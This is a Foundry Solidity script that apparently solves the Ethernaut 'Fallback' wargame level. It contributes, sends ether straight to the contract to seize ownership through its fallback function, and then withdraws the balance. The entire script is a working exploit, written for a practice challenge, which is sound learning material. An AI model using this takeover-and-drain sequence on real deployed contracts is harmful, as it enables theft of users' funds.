// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/fallback.sol";

contract FallbackScript is Script {
    Fallback public fb;

    function setUp() public {
        address payable sender = payable(
            0xAA67D0160a1b12422b5805bFf4C44D3D41c42F0E
        );
        fb = Fallback(sender);
    }

    function run() public {
        vm.startBroadcast();
        console2.log(msg.sender);
        fb.contribute{value: 0.0001 ether}();
        fb.getContribution();
        address(fb).call{value: 0.0001 ether}("");
        fb.owner();
        fb.withdraw();
        address(fb).balance;
        vm.stopBroadcast();
    }
}
